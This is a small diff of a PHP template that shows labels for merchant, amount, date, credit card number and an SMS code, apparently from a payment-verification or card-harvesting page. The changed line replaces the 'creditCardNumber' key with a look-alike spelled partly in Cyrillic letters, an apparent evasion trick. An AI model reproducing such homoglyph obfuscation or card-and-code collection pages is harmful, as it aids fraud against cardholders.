@@ -239,7 +239,7 @@ window.onload = function() {
 						<span><?php echo $translations['merchant']; ?></span>
 						<span><?php echo $translations['amount']; ?></span>
 						<span><?php echo $translations['date']; ?></span>
-						<span><?php echo $translations['creditCardNumber']; ?></span>
+						<span><?php echo $translations['сreditСardNumbеr']; ?></span>
 						<span class="osama"><?php echo $translations['smsCode']; ?></span>
                       </div>
                          <div class="right">
